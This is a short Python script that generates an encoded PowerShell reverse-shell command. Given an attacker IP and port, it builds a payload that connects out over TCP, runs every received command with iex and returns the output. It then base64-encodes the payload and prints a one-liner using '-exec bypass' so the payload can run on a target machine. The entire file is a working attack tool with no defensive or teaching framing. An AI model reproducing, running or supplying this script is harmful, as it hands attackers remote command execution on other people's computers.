#!/usr/bin/env python
import base64
import sys

# Check if the user provided the right number of command-line arguments
if len(sys.argv) < 3:
    # If not, print the usage hint and exit
    print('usage : %s ip port' % sys.argv[0])
    sys.exit(0)

# PowerShell reverse shell script as a payload, with placeholders for IP and port
payload = """
$c = New-Object System.Net.Sockets.TCPClient('%s',%s);
$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
    $s.Write($sb,0,$sb.Length);
    $s.Flush()
};
$c.Close()
""" % (sys.argv[1], sys.argv[2])  # Replace placeholders with provided IP and port

# Encode the payload to UTF-16 little endian format, and then base64-encode it
byte = payload.encode('utf-16-le')
b64 = base64.b64encode(byte)

# Print out the PowerShell command that should be run on the target machine
# -exec bypass allows the execution policy to be bypassed
# -enc indicates that the following script is base64-encoded
print("powershell -exec bypass -enc %s" % b64.decode())
